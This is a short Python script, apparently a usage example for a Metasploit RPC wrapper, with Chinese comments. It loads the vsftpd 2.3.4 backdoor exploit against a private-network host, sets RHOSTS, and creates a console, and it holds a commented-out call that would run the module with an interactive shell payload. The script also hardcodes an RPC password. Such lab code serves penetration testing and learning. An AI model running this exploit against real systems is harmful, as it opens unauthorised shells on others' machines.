from zdppy_metasploit import Metasploit

msf = Metasploit(
    username="msf",
    password="zhangdapeng",
    host="192.168.160.129",
    port=55552,
    path="/api/",
    is_ssl=False,
    token=None,
    encoding="utf-8",
    headers={"Content-type": "binary/message-pack"},
)

# 利用模块
exploit = msf.client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")

# 查看目标
msf.log.info(exploit.target)
msf.log.info(exploit.targets)
msf.log.info(exploit.default_target)

# 找到目标的有效载荷
msf.log.info(exploit.targetpayloads())

# 查看和设置模块选项
msf.log.info(exploit.options)

# 修改后再次查看必须要设置的模块选项
msf.log.info(exploit.missing_required)
exploit["RHOSTS"] = "192.168.160.130"
msf.log.info(exploit.missing_required)

# 查看运行时参数
msf.log.info(exploit.runoptions)

# 创建控制台
console_id = msf.client.consoles.console().cid
msf.log.info("控制台ID：", console_id)
console = msf.client.consoles.console(console_id)  # 获取控制台
msf.log.info("控制台：", console)

# 使用控制台利用模块
# out = console.run_module_with_output(exploit, payload="cmd/unix/interact")
# msf.log.info(out)
